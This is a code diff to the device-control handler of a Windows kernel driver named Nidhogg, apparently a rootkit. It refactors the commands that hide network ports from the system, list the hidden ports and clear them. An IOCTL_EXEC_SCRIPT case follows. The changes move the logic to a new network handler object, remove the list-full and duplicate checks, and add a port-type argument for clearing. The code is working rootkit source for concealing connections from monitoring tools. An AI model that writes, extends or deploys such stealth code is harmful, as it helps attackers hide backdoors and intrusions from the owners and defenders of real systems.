@@ -1213,28 +1213,15 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		}
 
 		if (data->Hide) {
-			if (NidhoggNetworkUtils->GetPortsCount() == MAX_PORTS) {
-				Print(DRIVER_PREFIX "List is full.\n");
-				status = STATUS_TOO_MANY_CONTEXT_IDS;
+			if (!NidhoggNetworkHandler->AddHiddenPort(hiddenPort)) {
+				Print(DRIVER_PREFIX "Failed to add port.\n");
+				status = STATUS_UNSUCCESSFUL;
 				break;
 			}
-
-			if (!NidhoggNetworkUtils->FindHiddenPort(hiddenPort)) {
-				if (!NidhoggNetworkUtils->AddHiddenPort(hiddenPort)) {
-					Print(DRIVER_PREFIX "Failed to add port.\n");
-					status = STATUS_UNSUCCESSFUL;
-					break;
-				}
-				Print(DRIVER_PREFIX "Hid port %d.\n", hiddenPort.Port);
-			}
+			Print(DRIVER_PREFIX "Hid port %d.\n", hiddenPort.Port);
 		}
 		else {
-			if (NidhoggNetworkUtils->GetPortsCount() == 0) {
-				status = STATUS_NOT_FOUND;
-				break;
-			}
-
-			if (!NidhoggNetworkUtils->RemoveHiddenPort(hiddenPort)) {
+			if (!NidhoggNetworkHandler->RemoveHiddenPort(hiddenPort)) {
 				status = STATUS_NOT_FOUND;
 				break;
 			}
@@ -1248,19 +1235,26 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 	{
 		auto size = stack->Parameters.DeviceIoControl.OutputBufferLength;
 
-		if (!IsValidSize(size, sizeof(OutputHiddenPorts))) {
+		if (!IsValidSize(size, sizeof(IoctlHiddenPorts))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
-		auto data = static_cast<OutputHiddenPorts*>(Irp->AssociatedIrp.SystemBuffer);
-		NidhoggNetworkUtils->QueryHiddenPorts(data);
+		auto data = static_cast<IoctlHiddenPorts*>(Irp->AssociatedIrp.SystemBuffer);
+		NidhoggNetworkHandler->ListHiddenPorts(data);
 
 		len += size;
 		break;
 	}
 	case IOCTL_CLEAR_HIDDEN_PORTS:
 	{
-		NidhoggNetworkUtils->ClearHiddenPortsList();
+		auto size = stack->Parameters.DeviceIoControl.OutputBufferLength;
+
+		if (size != sizeof(PortType)) {
+			status = STATUS_INVALID_BUFFER_SIZE;
+			break;
+		}
+		auto data = static_cast<PortType*>(Irp->AssociatedIrp.SystemBuffer);
+		NidhoggNetworkHandler->ClearHiddenPortsList(*data);
 		break;
 	}
 	case IOCTL_EXEC_SCRIPT:
